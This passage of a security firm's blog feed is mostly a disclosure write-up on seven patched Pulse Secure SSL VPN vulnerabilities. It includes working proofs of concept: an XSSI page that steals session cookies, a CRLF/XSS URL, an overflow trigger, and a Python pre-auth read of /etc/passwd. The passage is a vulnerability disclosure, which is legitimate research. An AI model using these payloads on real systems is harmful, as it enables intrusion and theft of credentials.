      &lt;td style=&quot;text-align: left&quot;&gt;é™„éŒ„ A.9.4.3 é€šè¡Œç¢¼ç®¡ç†ç³»çµ±&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;AD é‡å¤§æ¼æ´æœªä¿®è£œ&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;é™„éŒ„ A.12.6.1 æŠ€è¡“è„†å¼±æ€§ç®¡ç†&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;æœªé™åˆ¶ä¾†æº IP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;é™„éŒ„ A.9.4.1 ç³»çµ±å­˜å–é™åˆ¶&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;7&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;æ¬¡è¦ç¶²ç«™é˜²è­·ä¸è¶³&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;é™„éŒ„ A.14.1.1 è³‡è¨Šå®‰å…¨è¦æ±‚äº‹é …åˆ†æåŠè¦æ ¼&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;8&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;VPN ç¶²æ®µå­˜å–å…§éƒ¨ç³»çµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;é™„éŒ„ A.13.1.3 ç¶²è·¯å€éš”&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;å¦å¤–ï¼Œå¾æ¼”ç·´çš„çµæœå¯ä»¥ç™¼ç¾ä¸‹è¡¨é …æ¬¡ 1 åŠé …æ¬¡ 2 çš„æ©Ÿç‡éƒ½è¢«è­‰å¯¦æœƒç™¼ç”Ÿä¸”ä½æ–¼å…¥ä¾µæ ¸å¿ƒè³‡ç”¢çš„è·¯å¾‘ä¸Šï¼Œå› æ­¤è¡æ“ŠåŠæ©Ÿç‡å‡æ‡‰è©²ç”±åŸæœ¬çš„ 2 æå‡ç‚º 3ï¼Œé€™å°è‡´é …æ¬¡ 1 çš„é¢¨éšªå€¼è¶…éäº†ä¼æ¥­åŸæœ¬è¨­å®šçš„å¯æ¥å—é¢¨éšª (27)ï¼›å¦å¤–ï¼Œå„˜ç®¡åœ¨æ¼”ç·´çµæœä¸­æ¸…æ¥šçš„çŸ¥é“é …æ¬¡ 2 çš„å…§éƒ¨å·®å‹¤ç³»çµ±æ˜¯å¿…ç„¶å¯ä»¥æˆåŠŸå…¥ä¾µä¸”é–“æ¥æ§åˆ¶æ ¸å¿ƒè³‡ç”¢çš„ç³»çµ±ï¼Œå…¶é¢¨éšªå€¼ä»é ä½æ–¼ä¼æ¥­æœƒé€²è¡Œè™•ç†çš„é¢¨éšªï¼Œé€™æ­£æ˜¯æˆ‘å€‘å‰é¢æ‰€æåˆ°ä½ä¼°æˆ°ç•¥åƒ¹å€¼çš„å•é¡Œï¼Œå› æ­¤æˆ‘å€‘æœƒå»ºè­°ï¼Œ&lt;strong&gt;åœ¨ç´…éšŠæ¼”ç·´è·¯å¾‘ä¸Šå¯ä»¥ç²å¾—æ ¸å¿ƒè³‡ç”¢çš„é¢¨éšªé …ç›®ï¼Œéƒ½æ‡‰è©²è¦–ç‚ºä¸å¯æ¥å—é¢¨éšªä¾†é€²è¡Œè™•ç†&lt;/strong&gt;ã€‚&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;é …æ¬¡&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;è³‡ç”¢åç¨±&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;åƒ¹å€¼&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;å¨è„…&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;å¼±é»&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;è¡æ“Š&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;æ©Ÿç‡&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;é¢¨éšª&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç‰ˆæœ¬æ›´æ–°ç³»çµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;æœªç¶“æˆæ¬Šå­˜å–&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;æ©«å‘ç§»å‹•&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;27&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;å…§éƒ¨å·®å‹¤ç³»çµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç³»çµ±å…¥ä¾µ&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç„¡æ³•ä¸Š patch&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;9&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;æœ€å¾Œï¼Œå¼•ç”¨ &lt;a href=&quot;/blog/author/shaolin/&quot;&gt;Shaolin&lt;/a&gt; åœ¨ç ”è¨æœƒä¸Šçš„çµèª&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;ç´…éšŠæ¼”ç·´çš„ç²¾é«“ä¸æ˜¯åœ¨å‘Šè¨´ä½ æœ‰å¤šè„†å¼±ï¼Œåœ¨æ–¼çœŸæ­£å£äººé—–å…¥æ™‚ä½ å¯ä»¥ç¨ç•¶ä¸€é¢æ“‹ä¸‹ã€‚&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;å¸Œæœ›å„ä½éƒ½èƒ½æ‰¾åˆ°å¯ä»¥æŒçºŒæ”¹å–„é˜²ç¦¦ç­–ç•¥çš„æ–¹æ³•ï¼Œè®“ä¼æ¥­çš„ç’°å¢ƒæ›´åŠ å®‰å…¨ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/10/09/def-strategy/</link>
                <guid>https://devco.re/blog/2019/10/09/def-strategy</guid>
                <pubDate>Wed, 09 Oct 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Attacking SSL VPN - Part 3: The Golden Pulse Secure SSL VPN RCE Chain, with Twitter as Case Study!</title>
                <description>&lt;p&gt;Author: Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;) and Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;Hi, this is the last part of Attacking SSL VPN series. If you havenâ€™t read previous articles yet, here are the quick links for you:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf&quot;&gt;Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&quot;&gt;Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After we published our research at Black Hat, due to its great severity and huge impacts, it got lots of attention and discussions. Many people desire first-hand news and wonder when the exploit(especially the Pulse Secure preAuth one) will be released.&lt;/p&gt;

&lt;p&gt;We also discussed this internally. Actually, we could simply drop the whole exploits without any concern and acquire plenty of media exposures. However, as a SECURITY firm, our responsibility is to make the world more secure. So we decided to postpone the public disclosure to give the world more time to apply the patches!&lt;/p&gt;

&lt;p&gt;Unfortunately, the exploits were revealed by someone else. They can be easily found on GitHub&lt;sup&gt;&lt;a href=&quot;https://github.com/milo2012/CVE-2018-13379&quot;&gt;[1]&lt;/a&gt; &lt;a href=&quot;https://github.com/milo2012/CVE-2018-13382&quot;&gt;[2]&lt;/a&gt; &lt;a href=&quot;https://github.com/projectzeroindia/CVE-2019-11510&quot;&gt;[3]&lt;/a&gt;&lt;/sup&gt; and exploit-db&lt;sup&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/47297&quot;&gt;[1]&lt;/a&gt;&lt;/sup&gt;. Honestly, we couldnâ€™t say they are wrong, because the bugs are absolutely fixed several months ago, and they spent their time differing/reversing/reproducing. But itâ€™s indeed a worth discussing question to the security community: if you have a nuclear level weapon, when is it ready for public disclosure?&lt;/p&gt;

&lt;p&gt;We heard about more than 25 bug bounty programs are exploited. From the statistics of &lt;a href=&quot;https://badpackets.net/over-14500-pulse-secure-vpn-endpoints-vulnerable-to-cve-2019-11510/&quot;&gt;Bad Packet&lt;/a&gt;, numerous Fortune 500, U.S. military, governments, financial institutions and universities are also affected by this. There are even &lt;a href=&quot;https://twitter.com/sherlocksecure/status/1164492373591642112&quot;&gt;10 NASA servers exposed for this bug&lt;/a&gt;. So, these premature public disclosures indeed force these entities to upgrade their SSL VPN, this is the good part.&lt;/p&gt;

&lt;p&gt;On the other hand, the bad part is that there is an increasing number of &lt;a href=&quot;https://www.securityweek.com/hackers-target-vulnerabilities-fortinet-pulse-secure-products&quot;&gt;botnets&lt;/a&gt; scanning the Internet in the meanwhile. An &lt;a href=&quot;https://twitter.com/GossiTheDog/status/1167170305577689091&quot;&gt;intelligence&lt;/a&gt; also points out that there is already a China APT group exploiting this bug. This is such an Internet disaster. Apparently, the world is not ready yet. So, if you havenâ€™t updated your Palo Alto, Fortinet or Pulse Secure SSL VPN, please update it ASAP!&lt;/p&gt;

&lt;h1 id=&quot;about-pulse-secure&quot;&gt;About Pulse Secure&lt;/h1&gt;

&lt;p&gt;Pulse Secure is the market leader of SSL VPN which provides professional secure access solutions for Hybrid IT. Pulse Secure has been in our research queue for a long time because it was a &lt;a href=&quot;https://archive.li/8pzwf&quot;&gt;critical infrastructure of Google&lt;/a&gt;, which is one of our long-term targets. However, Google applies the Zero Trust security model, and therefore the VPN is removed now.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We started to review Pulse Secure in mid-December last year. In the first 2 months, we got nothing. Pulse Secure has a good coding style and security awareness so that itâ€™s hard to find trivial bugs. Here is an interesting comparison, we found the arbitrary file reading &lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-384&quot;&gt;CVE-2018-13379&lt;/a&gt; on FortiGate SSL VPN on our first research dayâ€¦&lt;/p&gt;

&lt;p&gt;Pulse Secure is also a Perl lover, and writes lots of Perl extensions in C++. The interaction between Perl and C++ is also confusing to us, but we got more familiar with it while we paid more time digging in it. Finally, we got the first blood on &lt;strong&gt;March 8, 2019&lt;/strong&gt;! Itâ€™s a stack-based overflow on the management interface! Although this bug isnâ€™t that useful, our research progress got on track since that, and we uncovered more and more bugs.&lt;/p&gt;

&lt;p&gt;We reported all of our finding to Pulse Secure PSIRT on &lt;strong&gt;March 22, 2019&lt;/strong&gt;. Their response is very quick and they take these vulnerabilities seriously! After several conference calls with Pulse Secure, &lt;strong&gt;they fixed all bugs just within a month&lt;/strong&gt;, and released the patches on &lt;strong&gt;April 24, 2019&lt;/strong&gt;. You can check the detailed &lt;a href=&quot;https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/&quot;&gt;security advisory&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;Itâ€™s a great time to work with Pulse Secure. From our perspective, Pulse Secure is the most responsible vendor among all SSL VPN vendors we have reported bugs to!&lt;/p&gt;

&lt;h1 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h1&gt;

&lt;p&gt;We have found 7 vulnerabilities in total. Here is the list. We will introduce each one but focus on the CVE-2019-11510 and CVE-2019-11539 more.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2019-11510 - Pre-auth Arbitrary File Reading&lt;/li&gt;
  &lt;li&gt;CVE-2019-11542 - Post-auth(admin) Stack Buffer Overflow&lt;/li&gt;
  &lt;li&gt;CVE-2019-11539 - Post-auth(admin) Command Injection&lt;/li&gt;
  &lt;li&gt;CVE-2019-11538 - Post-auth(user) Arbitrary File Reading via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11508 - Post-auth(user) Arbitrary File Writing via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11540 - Post-auth Cross-Site Script Inclusion&lt;/li&gt;
  &lt;li&gt;CVE-2019-11507 - Post-auth Cross-Site Scripting&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;affected-versions&quot;&gt;Affected versions&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Pulse Connect Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.3R1 - 8.3R7&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.2R1 - 8.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.1R1 - 8.1R15&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.4R1 - 5.4R7&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.3R1 - 5.3R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.2R1 - 5.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.1R1 - 5.1R15&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;cve-2019-11540-cross-site-script-inclusion&quot;&gt;CVE-2019-11540: Cross-Site Script Inclusion&lt;/h2&gt;

&lt;p&gt;The script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/cs/cs.cgi&lt;/code&gt; renders the session ID in JavaScript. As the content-type is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;application/x-javascript&lt;/code&gt;, we could perform the XSSI attack to steal the DSID cookie!&lt;/p&gt;

&lt;p&gt;Even worse, the CSRF protection in Pulse Secure SSL VPN is based on the DSID. With this XSSI, we can bypass all the CSRF protection!&lt;/p&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- http://attacker/malicious.html --&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://sslvpn/dana/cs/cs.cgi?action=appletobj&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;writeln&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;DSID&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;ReplaceContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cve-2019-11507-cross-site-scripting&quot;&gt;CVE-2019-11507: Cross-Site Scripting&lt;/h2&gt;

&lt;p&gt;There is a CRLF Injection in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/home/cts_get_ica.cgi&lt;/code&gt;. Due to the injection, we can forge arbitrary HTTP headers and inject malicious HTML contents.&lt;/p&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://sslvpn/dana/home/cts_get_ica.cgi
?bm_id=x
&amp;amp;vdi=1
&amp;amp;appname=aa%0d%0aContent-Type::text/html%0d%0aContent-Disposition::inline%0d%0aaa:bb&amp;lt;svg/onload=alert(document.domain)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cve-2019-11538-post-authuser-arbitrary-file-reading-via-nfs&quot;&gt;CVE-2019-11538: Post-auth(user) Arbitrary File Reading via NFS&lt;/h2&gt;

&lt;p&gt;The following two vulnerabilities (CVE-2019-11538 and CVE-2019-11508) do not affect default configurations. It appears only if the admin configures the NFS sharing for the VPN users.&lt;/p&gt;

&lt;p&gt;If an attacker can control any files on remote NFS server, he can just create a symbolic link to any file, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;, and read it from web interface. The root cause is that the implementation of NFS mounts the remote server as a real Linux directory, and the script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/fb/nfs/nfb.cgi&lt;/code&gt; does not check whether the accessed file is a symlink or not!&lt;/p&gt;

&lt;h2 id=&quot;cve-2019-11508-post-authuser-arbitrary-file-writing-via-nfs&quot;&gt;CVE-2019-11508: Post-auth(user) Arbitrary File Writing via NFS&lt;/h2&gt;

&lt;p&gt;This one is a little bit similar to the previous one, but with a different attack vector!&lt;/p&gt;

&lt;p&gt;When the attacker uploads a ZIP file to the NFS through the web interface, the script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/fb/nfs/nu.cgi&lt;/code&gt; does not sanitize the filename in the ZIP. Therefore, an attacker can build a malicious ZIP file and traverse the path with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../&lt;/code&gt; in the filename! Once Pulse Secure decompresses, the attacker can upload whatever he wants to whatever path!&lt;/p&gt;

&lt;h2 id=&quot;cve-2019-11542-post-authadmin-stack-buffer-overflow&quot;&gt;CVE-2019-11542: Post-auth(admin) Stack Buffer Overflow&lt;/h2&gt;

&lt;p&gt;There is a stack-based buffer overflow in the following Perl module implementations:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;DSHC::ConsiderForReporting&lt;/li&gt;
  &lt;li&gt;DSHC::isSendReasonStringEnabled&lt;/li&gt;
  &lt;li&gt;DSHC::getRemedCustomInstructions&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These implementations use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sprintf&lt;/code&gt; to concatenate strings without any length check, which leads to the buffer overflow. The bug can be triggered in many places, but here we use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana-admin/auth/hc.cgi&lt;/code&gt; as our PoC.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://sslvpn/dana-admin/auth/hc.cgi
?platform=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&amp;amp;policyid=0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And you can observed the segment fault from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmesg&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cgi-server[22950]: segfault at 61616161 ip 0000000002a80afd sp 00000000ff9a4d50 error 4 in DSHC.so[2a2f000+87000]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cve-2019-11510-pre-auth-arbitrary-file-reading&quot;&gt;CVE-2019-11510: Pre-auth Arbitrary File Reading&lt;/h2&gt;

&lt;p&gt;Actually, this is the most severe bug in this time. It is in the web server implementation. As our slides mentioned, Pulse Secure implements their own web server and architecture stack from scratch. The original path validation is very strict. However, since version 8.2, Pulse Secure introduced a new feature called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTML5 Access&lt;/code&gt;, itâ€™s a feature used to interact with Telnet, SSH, and RDP by browsers. Thanks to this new feature, the original path validation becomes loose.&lt;/p&gt;

&lt;p&gt;In order to handle the static resources, Pulse Secure created a new IF-CONDITION to widen the originally strict path validation. The code wrongly uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request-&amp;gt;uri&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request-&amp;gt;filepath&lt;/code&gt;, so that we can specify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/html5acc/guacamole/&lt;/code&gt; in the end of the query string to bypass the validation and make &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request-&amp;gt;filepath&lt;/code&gt; to any file you want to download!&lt;/p&gt;

&lt;p&gt;And itâ€™s worth to mention that in order to read arbitrary files, you must to specify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/html5acc/guacamole/&lt;/code&gt; in the middle of the path again. Otherwise, you can only download limited file extensions such as .json, .xml or .html.&lt;/p&gt;

&lt;p&gt;Due to the exploit is in the wild, there is no longer any concern to show the payload:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;https://sslvpn/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cve-2019-11539-post-authadmin-command-injection&quot;&gt;CVE-2019-11539: Post-auth(admin) Command Injection&lt;/h2&gt;

&lt;p&gt;The last one is a command injection on the management interface. We found this vulnerability very early, but could not find a way to exploit it at first. While we were in Vegas, one of my friends told me that he found the same bug before, but he didnâ€™t find a way to exploit it, so he didnâ€™t report to the vendor.&lt;/p&gt;

&lt;p&gt;However, we did it, and we exploit it in a very smart way :)&lt;/p&gt;

&lt;p&gt;The root cause of this vulnerability is very simple. Here is a code fragment of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana-admin/diag/diag.cgi&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;tcpdump_options_syntax_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;CGI::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;));&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tcpdump_options_syntax_check&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
